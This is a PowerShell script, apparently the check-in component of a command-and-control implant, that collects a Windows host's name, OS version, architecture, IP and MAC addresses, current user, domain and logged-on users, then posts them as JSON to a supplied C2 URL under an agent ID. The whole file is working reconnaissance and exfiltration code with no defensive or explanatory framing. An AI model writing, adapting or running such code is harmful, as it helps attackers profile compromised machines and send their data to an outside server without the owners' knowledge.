param (
    [string]$C2Url,
    [string]$AgentID
)

function Get-SystemInfo {
    $info = @{
        "Hostname" = $env:COMPUTERNAME
        "OS" = Get-WmiObject Win32_OperatingSystem | Select-Object -ExpandProperty Caption
        "OSVersion" = Get-WmiObject Win32_OperatingSystem | Select-Object -ExpandProperty Version
        "Architecture" = if ($env:PROCESSOR_ARCHITEW6432) { "64-bit" } else { "32-bit" }
        "IP" = (Test-Connection -ComputerName $env:COMPUTERNAME -Count 1).IPv4Address.IPAddressToString
        "MAC" = (Get-WmiObject -Class Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled -eq $true }).MACAddress
        "User" = $env:USERNAME
        "Domain" = $env:USERDOMAIN
        "LoggedOnUsers" = (Get-WmiObject -Class Win32_ComputerSystem | Select-Object -ExpandProperty UserName)
    }
    return $info
}

function Send-SystemInfo {
    param (
        [hashtable]$SystemInfo
    )
    $json = $SystemInfo | ConvertTo-Json
    $body = @{
        "agent_id" = $AgentID
        "system_info" = $json
    } | ConvertTo-Json
    Invoke-RestMethod -Uri $C2Url -Method POST -Body $body -ContentType "application/json"
}

$systemInfo = Get-SystemInfo
Send-SystemInfo -SystemInfo $systemInfo
